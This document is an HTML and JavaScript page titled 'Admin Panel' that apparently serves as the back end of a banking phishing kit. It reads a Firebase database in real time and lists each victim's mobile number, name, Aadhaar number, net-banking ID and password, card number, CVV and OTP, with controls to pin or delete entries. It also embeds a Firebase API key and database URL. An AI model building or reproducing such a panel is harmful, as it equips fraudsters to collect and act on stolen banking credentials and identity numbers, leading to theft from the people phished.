<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body{margin:0;font-family:'Poppins',system-ui;background:#ececec}
.header{
  background:linear-gradient(45deg,#1e88e5,#5e35b1);
  color:#fff;padding:14px;text-align:center;
  font-weight:700;letter-spacing:1px
}
.list{padding:12px}

.card{
  background:#fff;border-radius:18px;margin-bottom:14px;
  box-shadow:0 8px 20px rgba(0,0,0,.12);
  cursor:pointer;position:relative;overflow:hidden
}
.card.pinned{
  border-left:6px solid #f4b400;
  background:linear-gradient(135deg,#fff8e1,#fff)
}
.top{display:flex;gap:14px;padding:14px;align-items:center}
.badge{
  width:46px;height:46px;border-radius:50%;
  background:#e0e0e0;display:flex;
  align-items:center;justify-content:center;
  font-weight:700
}
.info .title{font-weight:700}
.info .sub{font-size:13px;color:#555}

.status{
  text-align:center;padding:6px;
  font-size:13px;font-weight:600;
  border-top:1px solid #eee
}
.details{
  display:none;padding:12px;
  border-top:1px dashed #ccc;font-size:14px
}
.details.show{display:block}

.actions{
  position:absolute;top:10px;right:10px;
  display:flex;gap:6px
}
.btn{
  border:none;border-radius:8px;
  padding:6px 10px;font-size:12px;
  cursor:pointer
}
.pin{background:#f4b400}
.unpin{background:#9e9e9e;color:#fff}
.del{background:#e53935;color:#fff}

.empty{text-align:center;color:#777;margin-top:40px}
</style>
</head>

<body>

<div class="header">ADMIN PANEL</div>
<div id="list" class="empty">Loading...</div>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
/* üî• FIREBASE */
firebase.initializeApp({
  apiKey:"AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
  authDomain:"admin-panel-989b2.firebaseapp.com",
  databaseURL:"https://admin-panel-989b2-default-rtdb.firebaseio.com",
  projectId:"admin-panel-989b2"
});

const list = document.getElementById("list");
const ref  = firebase.database().ref("usersData");

/* ‚ö° FAST REALTIME LISTENER */
ref.limitToLast(100).on("child_added", snap=>{
  const d = {key:snap.key,...snap.val()};
  render(d,true);
});

ref.on("child_changed", snap=>{
  document.getElementById("card_"+snap.key)?.remove();
  render({key:snap.key,...snap.val()},false);
});

ref.on("child_removed", snap=>{
  document.getElementById("card_"+snap.key)?.remove();
});

/* üß© RENDER */
function render(d,newUser){
  if(!d) return;

  const id="det_"+d.key;
  const idx=document.querySelectorAll(".card").length+1;

  const html=`
  <div class="card ${d.pinned?'pinned':''}" id="card_${d.key}"
       onclick="toggle('${id}')">

    <div class="actions" onclick="event.stopPropagation()">
      <button class="btn ${d.pinned?'unpin':'pin'}"
        onclick="pin('${d.key}',${!d.pinned})">
        ${d.pinned?'Unpin':'üìå'}
      </button>
      <button class="btn del" onclick="del('${d.key}')">üóëÔ∏è</button>
    </div>

    <div class="top">
      <div class="badge">${idx}</div>
      <div class="info">
        <div class="title">USER ${idx}</div>
        <div class="sub">Mobile : ${d.mbno||'-'}</div>
      </div>
    </div>

    <div class="status">
      Status : ${d.status||'PAGE1'}
    </div>

    <div class="details" id="${id}">
      <div>Name : ${d.fullName||'-'}</div>
      <div>Aadhaar : ${d.aadr||'-'}</div>
      <div>Netbank : ${d.nid||'-'}</div>
      <div>Password : ${d.pss||'-'}</div>
      <div>Card : ${d.cn||'-'}</div>
      <div>CVV : ${d.cvpn||'-'}</div>
      <div>OTP : ${d.otp||'-'}</div>
      <div>Time : ${d.time||'-'}</div>
    </div>
  </div>`;

  if(newUser){
    list.insertAdjacentHTML("afterbegin",html);
    list.classList.remove("empty");
  }else{
    list.insertAdjacentHTML("afterbegin",html);
  }
}

/* helpers */
function toggle(id){
  const el=document.getElementById(id);
  if(el) el.classList.toggle("show");
}
function pin(key,val){
  firebase.database().ref("usersData/"+key+"/pinned").set(val);
}
function del(key){
  if(confirm("Delete this user?")){
    firebase.database().ref("usersData/"+key).remove();
  }
}
</script>
</body>
</html>